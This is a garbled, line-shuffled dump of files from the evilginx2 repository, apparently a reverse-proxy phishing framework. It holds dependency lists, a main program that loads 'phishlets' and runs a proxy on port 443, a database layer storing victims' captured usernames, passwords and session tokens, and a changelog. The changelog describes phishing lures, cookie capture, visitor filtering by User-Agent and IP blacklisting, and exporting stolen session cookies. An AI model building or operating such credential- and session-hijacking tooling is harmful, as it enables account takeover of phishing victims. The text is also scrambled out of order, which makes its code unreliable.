github.com/grpc-ecosystem/go-grpc-middleware v1.0.0/go.mod h1:FiyG127CGDf3tlThmgyCl78X/SZQqEOJBCDaAfeWzPs=
golang.org/x/net v0.0.0-20180906233101-161cd47e91fd/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
github.com/tmc/grpc-websocket-proxy v0.0.0-20190109142713-0ad062ec5ee5/go.mod h1:ncp9v5uamzpCO7NfCPTXjqaC
H/lnzb
github.com/xeipuuv/gojsonschema v1.1.0/go.mod h1:5yf86TLmAcydyeJq5YvxkGPE2fm/u4myDekKRoLuqhs=
WWjE=
github.com/tidwall/rtree v0.0.0-20180113144539-6cd427091e0e/go.mod h1:/h
github.com/kr/pretty v0.1.0 h1:L/CwN0zerZDmRFUapSPitk6f
github.com/coreos/pkg v0.0.0-20180928190104-399ea9e2e55f/go.mod h1:E3G3o1h8I7cfcXa63jLwjI0eiQQMgzzUDFVpN/nH/eA=
golang.org/x/tools v0.0.0-20190506145303-2d16b83fe98c/go.mod h1:RgjU9mgBXZiqYHBnxXauZ1Gv1EHHAz9KjViQ78xBX0Q=
github.com/spf13/cast v1.3.0 h1:oget//CVOEoFewqQxwr0Ej5yjygnqGkvggSE/gB35Q8=
bin/
docs/
release/
phishlets/test-
img/
build/
ret = rel_path
"""github.com/kgretzky/evilginx2/database"""
"""path/filepath"""
"log.Fatal(""config: %v"", err)"
"""os/user"""
if !f.IsDir() {
"phishlets_dir = ""/usr/share/evilginx/phishlets/"""
"for _, f := range files {"
if rpname == nil 
"""io/ioutil"""
exe_dir := filepath.Dir(exe_path)
"phishlets_dir = joinPath(exe_dir, ""./phishlets"")"
"""os"""
"templates_dir = ""/usr/share/evilginx/templates/"""
"var cfg_dir = flag.String(""c"", """", ""Configuration directory path"")"
"log.Fatal(""provided phishlets directory path does not exist: %s"", "
phishlets_path := 
"crt_db, err := core.NewCertDb(crt_path, cfg, ns, hs)"
"ns, _ := core.NewNameserver(cfg)"
"templates_dir, os.FileMode(0700))"
"var debug_log = flag.Bool(""debug"", false, ""Enable debug output"")"
config_path := 
 len(rpname) < 2 {
"cfg_dir == """" {"
"log.Error(""blacklist: %s"", err)"
"files, err := ioutil.ReadDir(phishlets_path)"
"log.Fatal(""mkdir: %v"", err)"
developer_mode)
flag.Parse()
"log.Info(""loading configuration from: %s"", config_path)"
debug_log {
"log.Info(""debug output enabled"")"
"log.Fatal(""%v"", err)"
"hs, _ := core.NewHttpServer()"
"db, err := database.NewDatabase(filepath.Join("
"var templates_dir = flag.String(""t"", """", ""HTML templates directory path"")"
rpname := pr.FindStringSubmatch(f.Name())
"log.Error(""failed to load phishlet '%s': %v"", f.Name(), err)"
"cfg_dir, ""./crt"")"
"bl, err := core.NewBlacklist(filepath.Join("
"cfg_dir, """")"
"""regexp"""
"log.Info(""loading phishlets from: %s"", phishlets_path)"
"log.Fatal(""certdb: %v"", err)"
"""flag"""
if filepath.IsAbs(rel_path) {
"//log.Info(""loaded phishlet '%s' made by %s from '%s'"", pl.Name, pl.Author, f.Name())"
continue
 err != nil {
"cfg.AddPhishlet(pname, pl)"
"templates_dir = joinPath(exe_dir, ""./templates"")"
t.DoWork()
"log.Fatal(""failed to list phishlets directory '%s': %v"", phishlets_path, err)"
} else {
hp.Start()
"cfg_dir, ""data.db""))"
func main() {
"pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), cfg)"
log.DebugEnable(
"cfg_dir = filepath.Join(usr.HomeDir, "".evilginx"")"
phishlets_dir)
if err != nil {
"hp, _ := core.NewHttpProxy("""", 443, cfg, crt_db, db, bl, "
"""github.com/kgretzky/evilginx2/core"""
import (
err := os.MkdirAll(
"ret = filepath.Join(base_path, rel_path)"
"log.Fatal(""database: %v"", err)"
phishlets_dir
"cfg, err := core.NewConfig("
cfg_dir
"cfg_dir, ""blacklist.txt""))"
([a-zA-Z0-9
crt_path := joinPath(
"if pname != """" {"
"templates_dir == """" {"
"if _, err := os.Stat("
"if err := core.CreateDir(crt_path, 0700)"
"log.Fatal(""you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>"")"
pr := regexp.MustCompile(
templates_dir)
return ret
var ret string
.yaml
"func joinPath(base_path string, rel_path string) string {"
"usr, err := user.Current()"
"""github.com/kgretzky/evilginx2/log"""
cfg.SetTemplatesDir(
"t, err := core.NewTerminal(hp, cfg, crt_db, db, "
"var phishlets_dir = flag.String(""p"", """", ""Phishlets directory path"")"
 os.IsNotExist(err) {
"exe_path, _ := os.Executable()"
pname := rpname[1]
ns.Start()
core.Banner()
"var developer_mode = flag.Bool(""developer"", false, ""Enable developer mode (generates self-signed certificates for all hostnames)"")"
return
"cfg_dir, os.FileMode(0700))"
hs.Start()
"phishlets_dir == """" {"
debug_log)
os.MkdirAll(
package main
lures edit
"- Injected Javascript can be customized with values of custom parameters, specified in lure options."
- ACMEv2 support added to comply with LetsEncrypt requirements.
- Feature: IP blacklist with automated IP address blacklisting and blocking on all or unauthorized requests. Command: 
 with value 
lures edit <id> hostname <hostname>
2.3.1
"- Added lures, with which you can prepare custom phishing URLs with each having its own set of unique options ("
login
- Increased timeouts for proxying HTTP packets to 45 seconds.
with_params
- Deprecated 
" is triggered, the redirection will take place AFTER response cookies for that request are captured."
2.3.3
 commands and switched positions of 
 field under 
lures get-url <id> import <params_file>
- Added support for Go modules.
- Fixed: 
help lures
- Proxy can now create most of required 
{lure_url_html}
 in code to manage redirection to the phishing page with any form of user interaction. Command: 
 content-type header.
 option to 
- Increased the duration of whitelisting authorized connections for whole IP address from 15 seconds to 10 minutes.
- Redirection is now triggered only for responses with 
2.2.1
- Added ability to inject custom Javascript into proxied pages.
- Phishlet fields are now selectively lowercased and validated upon loading to prevent surprises.
- Feature: Create customized hostnames for every phishing lure. Command: 
"- List of custom parameters can now be imported directly from file (text, csv, json). Command: "
" on its own, making it much easier to create new phishlets."
- Made command help screen easier to read.
- Regular expression groups working with 
proxy
- Feature: Support for routing connection via SOCKS5 and HTTP(S) proxies. Command: 
"lures get-url <id> param1=value1 param2=""value2 with spaces"""
type
"- Added OpenGraph settings for lures, allowing to create enticing content for link previews."
lures edit <id> template <template>
"- Generated phishing urls can now be exported to file (text, csv, json). Command: "
- Removed setting custom parameters in lures options. Parameters will now only be sent encoded with the phishing url.
- Feature: Create and set up pre-phish HTML templates for your campaigns. Create your HTML file and place 
- Added 
2.3.0
- All search fields in the phishlet are now regular expressions by default (remember about proper escaping!).
- Added option to capture custom POST arguments additionally to credentials. Check 
- Restructured phishlet YAML config file to be easier to understand (phishlets from previous versions need to be updated to new format).
"- Fixed: Requesting LetsEncrypt certificates multiple times without restarting. Subsequent requests would result in ""No embedded JWK in JWS header"" error."
json
sub_filters
credentials
text/html
 and the variable name.
landing_path
lures get-url <id> import <params_file> export <export_file> <text
 or 
<id>
blacklist
{lure_url_js}
2.4.0
- Phishlets are now listed in a table.
 was not correctly activated when set under 
- Feature: Requests to phishing urls can now be rejected if User-Agent of the visitor doesn't match the whitelist regular expression filter for given lure. Command: 
custom
- Now when any of 
sub_filter
- Fixed session cookie output to support EditThisCookie on the latest Chrome version.
- Fixed: Multiple concurrent map writes when whitelisting IPs during heavy loads.
- Improved autofill for 
" section, which contains the domain and path for website's login page."
 for more info).
auth_urls
"- Added feature to inject custom POST arguments to requests. Useful when forcing users to tick that ""Remember me"" checkbox."
2.2.0
json>
2.3.2
 allowing to enable the sub_filter only when specific parameter was set with the phishing url.
- Feature: Custom parameters can now be embedded encrypted in the phishing url. Command: 
- Removed 'name' variable from phishlets. Phishlet name is now determined solely based on the filename.
 and replaced it with 
lures edit <id> ua_filter <regexp>
language: go
  - 1.10.x
sudo: false
notifications:
install: true
  email: false
  - master
github.com/tidwall/btree v0.0.0-20170113224114-9876f1454cf0 // indirect
github.com/gorilla/mux v1.7.3
github.com/chzyer/readline v0.0.0-20180603132655-2972be24d48e
module github.com/kgretzky/evilginx2
github.com/tidwall/buntdb v1.1.0
require (
github.com/go-acme/lego/v3 v3.1.0
github.com/fatih/color v1.7.0
go 1.12
github.com/tidwall/tinyqueue v0.0.0-20180302190814-1e39f5511563 // indirect
github.com/chzyer/test v0.0.0-20180213035817-a1ea475d72b1 // indirect
github.com/tidwall/gjson v1.3.2 // indirect
github.com/chzyer/logex v1.1.10 // indirect
golang.org/x/net v0.0.0-20200707034311-ab3426394381
github.com/miekg/dns v1.1.22
github.com/tidwall/grect v0.0.0-20161006141115-ba9a043346eb // indirect
github.com/inconshreveable/go-vhost v0.0.0-20160627193104-06d84117953b
github.com/mattn/go-colorable v0.1.4 // indirect
github.com/spf13/viper v1.4.0
github.com/tidwall/rtree v0.0.0-20180113144539-6cd427091e0e // indirect
github.com/elazarl/goproxy v0.0.0-20190911111923-ecfe977594f1
github.com/mwitkow/go-http-dialer v0.0.0-20161116154839-378f744fb2b8
 EXPECT A BAN OTHERWISE. THANK YOU!
 REPORT ONLY BUGS OR FEATURE SUGGESTIONS.
 DO NOT ASK FOR PHISHLETS.
 DO NOT ASK FOR HELP CREATING PHISHLETS.
 DO NOT ADVERTISE OR TRY TO SELL PHISHLETS.
 DO NOT ASK TO FIX PHISHLETS.
Dockerfile
LICENSE
media
Makefile
README.md
if !found {
Session{
s.Username = username
"Token),"
if err == nil {
sessions := []
"UpdateTime: time.Now().UTC().Unix(),"
"if err := json.Unmarshal([]byte(val), s)"
"RemoteAddr: remote_addr,"
"json:""update_time"""
Id         int                          
"_, err := d.sessionsGetBySid(sid)"
err := d.db.View(func(tx 
"err = d.sessionsUpdate(s.Id, s)"
return nil
"Id:         id,"
Tokens:     make(map[string]map[string]
Database) sessionsList() ([]
s.Custom[name] = value
found = true
"return fmt.Errorf(""session not found: %s"", sid)"
UpdateTime int64                        
"Database) sessionsUpdatePassword(sid string, password string) error {"
"json:""tokens"""
found := false
"Database) sessionsUpdateUsername(sid string, username string) error {"
"Database) sessionsUpdateCustom(sid string, name string, value string) error {"
"err := tx.AscendEqual(""sessions_id"", d.getPivot(map[string]int{""id"": id}), func(key, val string) bool {"
"SessionId:  sid,"
"tx.Ascend(""sessions_id"", func(key, val string) bool {"
"id, _ := d.getNextId(SessionTable)"
Database) sessionsGetBySid(sid string) (
Session) error {
type Token struct {
"json:""username"""
Token 
Database) sessionsDelete(id int) error {
buntdb.Tx) error {
Session{}
HttpOnly bool
UserAgent  string                       
"json:""custom"""
"const SessionTable = ""sessions"""
"sessions = append(sessions, s)"
return err
Phishlet   string                       
""", buntdb.IndexJSON(""id""))"
Path     string
err = d.db.Update(func(tx 
Database) sessionsGetById(id int) (
Database) sessionsInit() {
"Password:   """","
"Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) ("
"json.Unmarshal([]byte(val), s)"
if err != nil {
return true
""", buntdb.IndexJSON(""session_id""))"
"err := tx.AscendEqual(""sessions_sid"", d.getPivot(map[string]string{""session_id"": sid}), func(key, val string) bool {"
"Database) sessionsUpdateTokens(sid string, tokens map[string]map[string]"
"""fmt"""
import (
"tx.Set(d.genIndex(SessionTable, id), string(jf), nil)"
s.UpdateTime = time.Now().UTC().Unix()
Tokens     map[string]map[string]
CreateTime int64                        
Username   string                       
"Phishlet:   phishlet,"
"""github.com/tidwall/buntdb"""
"json:""phishlet"""
err := d.db.Update(func(tx 
"CreateTime: time.Now().UTC().Unix(),"
"d.db.CreateIndex(""sessions_id"", SessionTable"
Name     string
Password   string                       
Custom     map[string]string            
"d.db.CreateIndex(""sessions_sid"", SessionTable"
"Session, error) {"
"json:""useragent"""
"s, err := d.sessionsGetBySid(sid)"
"UserAgent:  useragent,"
"json:""remote_addr"""
RemoteAddr string                       
Value    string
func (d 
"""encoding/json"""
"""time"""
"json:""landing_url"""
"LandingURL: landing_url,"
"_, err := tx.Delete(d.genIndex(SessionTable, id))"
s.Password = password
"return nil, fmt.Errorf(""session already exists: %s"", sid)"
s := 
"return nil, err"
"return s, nil"
"json:""password"""
SessionId  string                       
s.Tokens = tokens
LandingURL string                       
Token) error {
return false
"json:""id"""
"Custom:     make(map[string]string),"
"json:""session_id"""
 err == nil {
"Username:   """","
"return sessions, nil"
"Database) sessionsUpdate(id int, s "
type Session struct {
package database
"jf, _ := json.Marshal(s)"
"return fmt.Errorf(""session ID not found: %d"", id)"
"json:""create_time"""
err = d.db.View(func(tx 
"return nil, err"
"if s_id, err = tx.Get(table_name "
return string(pivot)
"Database) getLastId(table_name string) (int, error) {"
import (
"err := d.sessionsUpdatePassword(sid, password)"
"1), nil)"
" "":"" "
var id int = 1
"""github.com/tidwall/buntdb"""
var err error
d.sessionsInit()
 strconv.Itoa(id)
err = d.sessionsDelete(id)
type Database struct {
db   
Database) ListSessions() ([]
buntdb.Tx) error {
Token) error {
"if id, err = strconv.Atoi(s_id)"
"d.db, err = buntdb.Open(path)"
" "":0:id"")"
Database{
"Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {"
buntdb.DB
return nil
"path: path,"
"Database) getNextId(table_name string) (int, error) {"
"pivot, _ := json.Marshal(t)"
Database) DeleteSessionById(id int) error {
 err == nil {
"err := d.sessionsUpdateTokens(sid, tokens)"
"_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)"
"return s, err"
 err != nil {
"Session, error) {"
"_, err := d.sessionsGetById(id)"
"Database) SetSessionUsername(sid string, username string) error {"
"err := d.sessionsUpdateUsername(sid, username)"
return err
"Database) SetSessionTokens(sid string, tokens map[string]map[string]"
"s, err := d.sessionsGetBySid(sid)"
"Database) genIndex(table_name string, id int) string {"
Database) DeleteSession(sid string) error {
err = d.sessionsDelete(s.Id)
Database) getPivot(t interface{}) string {
func NewDatabase(path string) (
path string
d.db.Shrink()
func (d 
"""strconv"""
"s, err := d.sessionsList()"
var s_id string
err = d.db.Update(func(tx 
package database
"""encoding/json"""
"err := d.sessionsUpdateCustom(sid, name, value)"
"Database) SetSessionCustom(sid string, name string, value string) error {"
tx.Set(table_name
""":0:id"", strconv.Itoa(id"
Database) Flush() {
if err != nil {
"return id, err"
"Database) SetSessionPassword(sid string, password string) error {"
return table_name 
"Database, error) {"
d := 
"return d, nil"
golang.org/x/text/transform
golang.org/x/net/internal/socket
 github.com/tidwall/btree v0.0.0-20170113224114-9876f1454cf0
github.com/cenkalti/backoff/v3
github.com/hashicorp/hcl/hcl/printer
github.com/go-acme/lego/v3/challenge/dns01
 github.com/gorilla/mux v1.7.3
golang.org/x/crypto/ocsp
 github.com/chzyer/readline v0.0.0-20180603132655-2972be24d48e
 github.com/miekg/dns v1.1.22
github.com/inconshreveable/go-vhost
github.com/spf13/cast
github.com/go-acme/lego/v3/certificate
github.com/spf13/jwalterweatherman
github.com/chzyer/readline
github.com/go-acme/lego/v3/platform/wait
github.com/hashicorp/hcl/json/scanner
 golang.org/x/net v0.0.0-20200707034311-ab3426394381
github.com/go-acme/lego/v3/challenge/tlsalpn01
github.com/go-acme/lego/v3/challenge
github.com/go-acme/lego/v3/acme/api/internal/sender
github.com/go-acme/lego/v3/certcrypto
github.com/tidwall/pretty
gopkg.in/square/go-jose.v2/cipher
github.com/tidwall/buntdb
github.com/mattn/go-colorable
github.com/hashicorp/hcl/hcl/token
 github.com/tidwall/tinyqueue v0.0.0-20180302190814-1e39f5511563
github.com/mattn/go-isatty
github.com/hashicorp/hcl/hcl/scanner
 gopkg.in/square/go-jose.v2 v2.3.1
github.com/tidwall/rtree/base
 github.com/fsnotify/fsnotify v1.4.7
github.com/spf13/viper
golang.org/x/crypto/ed25519/internal/edwards25519
github.com/hashicorp/hcl/hcl/strconv
github.com/elazarl/goproxy
github.com/spf13/afero
gopkg.in/square/go-jose.v2
 github.com/inconshreveable/go-vhost v0.0.0-20160627193104-06d84117953b
github.com/go-acme/lego/v3/lego
github.com/hashicorp/hcl/json/parser
github.com/tidwall/btree
github.com/tidwall/match
github.com/go-acme/lego/v3/acme/api/internal/secure
github.com/mitchellh/mapstructure
golang.org/x/text/secure/bidirule
github.com/go-acme/lego/v3/challenge/resolver
github.com/tidwall/grect
 github.com/spf13/viper v1.4.0
 golang.org/x/sys v0.0.0-20200323222414-85ca7c5b95cd
github.com/spf13/afero/mem
 github.com/tidwall/grect v0.0.0-20161006141115-ba9a043346eb
 github.com/hashicorp/hcl v1.0.0
golang.org/x/text/unicode/bidi
github.com/go-acme/lego/v3/challenge/http01
 github.com/mattn/go-isatty v0.0.8
golang.org/x/net/idna
 github.com/spf13/cast v1.3.0
golang.org/x/net/internal/socks
 github.com/pelletier/go-toml v1.2.0
gopkg.in/square/go-jose.v2/json
github.com/fatih/color
github.com/hashicorp/hcl/json/token
github.com/tidwall/rtree
 github.com/spf13/pflag v1.0.3
 github.com/mwitkow/go-http-dialer v0.0.0-20161116154839-378f744fb2b8
 github.com/spf13/jwalterweatherman v1.0.0
 github.com/cenkalti/backoff/v3 v3.0.0
github.com/go-acme/lego/v3/acme/api
 github.com/elazarl/goproxy v0.0.0-20190911111923-ecfe977594f1
golang.org/x/sys/unix
github.com/fsnotify/fsnotify
golang.org/x/net/internal/iana
github.com/go-acme/lego/v3/log
golang.org/x/text/unicode/norm
 github.com/fatih/color v1.7.0
github.com/hashicorp/hcl
github.com/spf13/pflag
 github.com/go-acme/lego/v3 v3.1.0
github.com/tidwall/gjson
github.com/tidwall/tinyqueue
 golang.org/x/text v0.3.2
 github.com/tidwall/pretty v1.0.0
golang.org/x/crypto/ed25519
 gopkg.in/yaml.v2 v2.2.2
golang.org/x/net/ipv4
 github.com/spf13/afero v1.1.2
 github.com/tidwall/match v1.0.1
github.com/go-acme/lego/v3/registration
golang.org/x/crypto/pbkdf2
golang.org/x/net/proxy
 github.com/tidwall/rtree v0.0.0-20180113144539-6cd427091e0e
 github.com/magiconair/properties v1.8.0
 github.com/tidwall/buntdb v1.1.0
golang.org/x/net/ipv6
github.com/go-acme/lego/v3/acme
 github.com/tidwall/gjson v1.3.2
 github.com/mitchellh/mapstructure v1.1.2
github.com/hashicorp/hcl/hcl/parser
github.com/miekg/dns
gopkg.in/yaml.v2
 golang.org/x/crypto v0.0.0-20200622213623-75b288015ac9
github.com/go-acme/lego/v3/acme/api/internal/nonces
golang.org/x/sys/windows
github.com/magiconair/properties
github.com/pelletier/go-toml
github.com/mwitkow/go-http-dialer
github.com/gorilla/mux
golang.org/x/net/bpf
github.com/hashicorp/hcl/hcl/ast
 github.com/mattn/go-colorable v0.1.4
"// that value is then embedded in another operation, for instance by being"
byteBuffer) base64() string {
"// incorrect. Because this method is intended for known-good objects, and a nil"
switch algorithm {
"return newBuffer(append(pad, data...))"
// Perform decompression based on algorithm
panic(err)
func mustSerializeJSON(value interface{}) []byte {
"""compress/flate"""
"func decompress(algorithm CompressionAlgorithm, input []byte) ([]byte, error) {"
default:
return inflate(input)
"// We never want to serialize the top-level value ""null,"" since it's not a"
data []byte
"func compress(algorithm CompressionAlgorithm, input []byte) ([]byte, error) {"
"func deflate(input []byte) ([]byte, error) {"
// Compress with DEFLATE
"byteBuffer) MarshalJSON() ([]byte, error) {"
return nil
"""bytes"""
func (b byteBuffer) bigInt() 
func (b 
"binary.BigEndian.PutUint64(data, num)"
encoded)
newBuffer(decoded)
byteBuffer) bytes() []byte {
"return stripWhitespaceRegex.ReplaceAllString(data, """")"
"panic(""Tried to serialize a nil pointer."")"
func (b byteBuffer) toInt() int {
func newBufferFromInt(num uint64) 
"// MarshalJSON will happily serialize it as the top-level value ""null"". If"
return json.Marshal(b.base64())
// Decompress with DEFLATE
"writer, _ := flate.NewWriter(output, 1)"
// Helper function to serialize known-good objects.
"""encoding/base64"""
"""gopkg.in/square/go-jose.v2/json"""
var encoded string
"return newBuffer(bytes.TrimLeft(data, """
return deflate(input)
"// Writing to byte buffer, err is always nil"
"_, err := io.Copy(output, reader)"
reader := flate.NewReader(bytes.NewBuffer(input))
 Copyright 2014 Square Inc.
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"""regexp"""
output := new(bytes.Buffer)
"if string(out) == ""null"" {"
"return output.Bytes(), err"
"func inflate(input []byte) ([]byte, error) {"
 See the License for the specific language governing permissions and
err = reader.Close()
byteBuffer{
byteBuffer {
"""encoding/binary"""
return err
return new(big.Int).SetBytes(b.data)
return out
"decoded, err := base64.RawURLEncoding.DecodeString(encoded)"
"if encoded == """" {"
if err != nil {
// Perform compression based on algorithm
"err := json.Unmarshal(data, "
type byteBuffer struct {
import (
// Note: It's not possible to directly check whether the data pointed at by an
"""math/big"""
"data := make([]byte, 8)"
big.Int {
// Handling nil here allows us to transparently handle nil slices when serializing.
 you may not use this file except in compliance with the License.
"_, _ = io.Copy(writer, bytes.NewBuffer(input))"
err := writer.Close()
" distributed under the License is distributed on an ""AS IS"" BASIS,"
func stripWhitespace(data string) string {
if len(data) > length {
if data == nil {
"// valid JOSE message. But if a caller passes in a nil pointer to this method,"
" Unless required by applicable law or agreed to in writing, software"
"func newFixedSizeBuffer(data []byte, length int) "
func newBuffer(data []byte) 
"data: data,"
"x00""))"
if b == nil {
byteBuffer) UnmarshalJSON(data []byte) error {
return int(b.bigInt().Int64())
return 
return base64.RawURLEncoding.EncodeToString(b.data)
 limitations under the License.
"return nil, err"
b = 
package jose
 You may obtain a copy of the License at
"return nil, ErrUnsupportedAlgorithm"
// https://groups.google.com/forum/
"// interface is a nil pointer, so we do this hacky workaround."
"// (https://github.com/square/go-jose/issues/22), the result will be"
" Licensed under the Apache License, Version 2.0 (the ""License"")"
!topic/golang-nuts/wnH302gBa4I
// base64-encoded and fed as input to a signing algorithm
"""io"""
"out, err := json.Marshal(value)"
return b.data
"pad := make([]byte, length-len(data))"
// Precondition: value is not a nil pointer.
case DEFLATE:
// byteBuffer represents a slice of bytes that can be serialized to url-safe base64.
// Strip all newlines and whitespace
"panic(""square/go-jose: invalid call to newFixedSizeBuffer (len(data) > length)"")"
     http://www.apache.org/licenses/LICENSE-2.0
"var stripWhitespaceRegex = regexp.MustCompile("""
"// pointer is not a known-good object, we are free to panic in this case."
var epk 
"// getEncryption extracts parsed ""enc"" from the raw JSON."
leaf := h.certificates[0]
"return epk, nil"
"A192KW"") // PBES2 "
return div
default:
KeyID      string
"func (parsed rawHeader) getP2C() (int, error) {"
case headerKeyID:
return div 
"""crypto/x509"""
Algorithm  string
p2c)
"PBES2_HS384_A192KW = KeyAlgorithm(""PBES2-HS384"
byteBuffer
Nonce      string
"""errors"""
"HS256 = SignatureAlgorithm(""HS256"") // HMAC using SHA-256"
"headerCompression = ""zip""  // CompressionAlgorithm"
"HS512 = SignatureAlgorithm(""HS512"") // HMAC using SHA-512"
"""crypto/elliptic"""
// returns an empty slice.
"b, err := json.Marshal(v)"
type KeyAlgorithm string
"if dvStr, ok := dv.(string)"
func (parsed rawHeader) getAPU() (
// trying to compact-serialize an object which can't be represented in
type ContentEncryption string
return true
"A192CBC_HS384 = ContentEncryption(""A192CBC-HS384"") // AES-CBC "
// from JSON in a generic manner and placed in this map.
if dvr == nil {
"err = fmt.Errorf(""failed to unmarshal algorithm: %v: %"
// These are set by go-jose and shouldn't need to be set by consumers of the
"A256CBC_HS512 = ContentEncryption(""A256CBC-HS512"") // AES-CBC "
var bb 
// A key in the protected header of a JWS object. Use of the Header...
out := make([]
opts.Intermediates = x509.NewCertPool()
return parsed.getByteBuffer(headerAPV)
"h.certificates, err = parseCertificateChain(c)"
return CompressionAlgorithm(parsed.getString(headerCompression))
// encrypt with AES-256 but passing only a 128-bit key as input.
"RS384 = SignatureAlgorithm(""RS384"") // RSASSA-PKCS-v1.5 using SHA-384"
"out[i], err = x509.ParseCertificate(raw)"
func (parsed rawHeader) getJWK() (
"// ErrUnprotectedNonce indicates that while parsing a JWS or JWE object, a"
err := json.Unmarshal(
// ContentType represents type of the contained data.
// Get JOSE name of curve
err = json.Unmarshal(
type SignatureAlgorithm string
case headerAlgorithm:
c := []string{}
"return nil, err"
"// getTag extracts parsed ""tag"" frpom the raw JSON."
// supported. This occurs when trying to instantiate an encrypter for an
"A128KW             = KeyAlgorithm(""A128KW"")             // AES key wrap (128)"
"A256KW"") // PBES2 "
"A256KW"")     // ECDH-ES "
x509.Certificate
return false
if h.ExtraHeaders == nil {
var s string
"A192GCMKW          = KeyAlgorithm(""A192GCMKW"")          // AES-GCM key wrap (192)"
func (parsed rawHeader) getAPV() (
"// getAlgorithm extracts parsed ""alg"" from the raw JSON as a KeyAlgorithm."
     http://www.apache.org/licenses/LICENSE-2.0
"err = fmt.Errorf(""failed to unmarshal x5c header: %v: %"
return KeyAlgorithm(parsed.getString(headerAlgorithm))
var v2 interface{}
var (
"PBES2_HS512_A256KW = KeyAlgorithm(""PBES2-HS512"
"dvr, "
case elliptic.P521():
"A192KW"")     // ECDH-ES "
"// for the selected algorithm. This can occur, for example, when trying to"
byteBuffer (int)
ExtraHeaders map[HeaderKey]interface{}
"// in the x5c header field of a message, if one was present. Returns"
"v"", err, string("
"PS512 = SignatureAlgorithm(""PS512"") // RSASSA-PSS using SHA512 and MGF1-SHA512"
// Unverified certificate chain parsed from x5c header.
"return out, nil"
"A256KW             = KeyAlgorithm(""A256KW"")             // AES key wrap (256)"
// ErrNotSupported serialization of object is not supported. This occurs when
// ErrUnsupportedAlgorithm indicates that a selected algorithm is not
rawHeader) {
"NONE    = CompressionAlgorithm("""")    // No compression"
epk)
"// getByteBuffer gets a byte buffer from the raw JSON. Returns (nil, nil) if"
"PBES2_HS256_A128KW = KeyAlgorithm(""PBES2-HS256"
if mod == 0 {
return parsed.getByteBuffer(headerIV)
"HS384 = SignatureAlgorithm(""HS384"") // HMAC using SHA-384"
h.KeyID = s
"headerIV  = ""iv""  // "
"func (parsed rawHeader) getCritical() ([]string, error) {"
"x509.Certificate, len(chain))"
func (dst rawHeader) merge(src 
// Get size of curve in bytes
 Copyright 2014 Square Inc.
// ErrUnsupportedKeyType indicates that the given key type/format is not
if opts.Intermediates == nil {
"headerAlgorithm   = ""alg""  // string"
case headerNonce:
 See the License for the specific language governing permissions and
"RSA_OAEP_256       = KeyAlgorithm(""RSA-OAEP-256"")       // RSA-OAEP-SHA256"
// Any headers not recognised above get unmarshaled
"headerNonce = ""nonce"" // string"
"raw, err := base64.StdEncoding.DecodeString(cert)"
if dst.isSet(k) {
// supported. This occurs when trying to instantiate an encrypter and passing
// nonce header parameter was included in an unprotected header object.
if err != nil {
"return p2c, nil"
"ECDH_ES_A192KW     = KeyAlgorithm(""ECDH-ES"
"ECDH_ES            = KeyAlgorithm(""ECDH-ES"")            // ECDH-ES"
// pass through to consuming code in case it wants to examine them.
// constants is preferred to enhance type safety.
"""fmt"""
var q []string
"A128GCM       = ContentEncryption(""A128GCM"")       // AES-GCM (128)"
return s
"ECDH_ES_A128KW     = KeyAlgorithm(""ECDH-ES"
h.Algorithm = s
"return q, nil"
switch crv {
"A192GCM       = ContentEncryption(""A192GCM"")       // AES-GCM (192)"
"// getAPU extracts parsed ""apu"" from the raw JSON."
opts.Intermediates.AddCert(intermediate)
"return nil, nil"
func (parsed rawHeader) getEncryption() ContentEncryption {
func (h Header) Certificates(opts x509.VerifyOptions) ([][]
"PS256 = SignatureAlgorithm(""PS256"") // RSASSA-PSS using SHA256 and MGF1-SHA256"
"// getCritical extracts parsed ""crit"" from the raw JSON. If omitted, it"
" Unless required by applicable law or agreed to in writing, software"
return parsed.getByteBuffer(headerTag)
// SignatureAlgorithm represents a signature (or MAC) algorithm.
return 
"return jwk, nil"
"A192KW             = KeyAlgorithm(""A192KW"")             // AES key wrap (192)"
"// getS2S extracts parsed ""p2s"" from the raw JSON."
 You may obtain a copy of the License at
// sanitized produces a cleaned-up header object from the raw JSON.
// could not be decrypted.
src {
"DIRECT             = KeyAlgorithm(""dir"")                // Direct encryption"
"for _, intermediate := range h.certificates[1:] {"
func (parsed rawHeader) getSignatureAlgorithm() SignatureAlgorithm {
// an error if there was no x5c header present or the chain could
dst[k] = v
"ErrInvalidKeySize = errors.New(""square/go-jose: invalid key size for algorithm"")"
case elliptic.P256():
// ErrInvalidKeySize indicates that the given key is not the correct size
"ES384 = SignatureAlgorithm(""ES384"") // ECDSA using P-384 and SHA-384"
"for i, cert := range chain {"
// The decoding of the constituent items is deferred because we want to marshal
bits := crv.Params().BitSize
"headerEPK = ""epk"" // "
"byteBuffer, error) {"
 HMAC-SHA256 (128)
const (
"func curveName(crv elliptic.Curve) (string, error) {"
"ES256 = SignatureAlgorithm(""ES256"") // ECDSA using P-256 and SHA-256"
type HeaderKey string
"for k, v := range parsed {"
"headerTag = ""tag"" // "
h.ExtraHeaders = map[HeaderKey]interface{}{}
func parseCertificateChain(chain []string) ([]
mod := bits % 8
"A256GCMKW          = KeyAlgorithm(""A256GCMKW"")          // AES-GCM key wrap (256)"
// ContentEncryption represents a content encryption algorithm.
"JSONWebKey, error) {"
type rawHeader map[HeaderKey]
"DEFLATE = CompressionAlgorithm(""DEF"") // DEFLATE (RFC 1951)"
return leaf.Verify(opts)
type Header struct {
v := parsed[headerP2C]
// Certificates verifies 
jwk)
"""encoding/base64"""
return parsed.getByteBuffer(headerP2S)
dvr := dst[k]
v := parsed[k]
var p2c int
"return """""
"headerP2C = ""p2c"" // "
 HMAC-SHA384 (192)
"err = fmt.Errorf(""failed to unmarshal key ID: %v: %"
return err
"v, ok := parsed[k]"
"ErrCryptoFailure = errors.New(""square/go-jose: error in cryptographic primitive"")"
"return dvStr != """""
"A128CBC_HS256 = ContentEncryption(""A128CBC-HS256"") // AES-CBC "
case headerJWK:
h.JSONWebKey = jwk
"ErrUnprotectedNonce = errors.New(""square/go-jose: Nonce parameter included in unprotected header"")"
// algorithm that is not yet implemented.
// an RSA private key with more than two primes.
if v == nil {
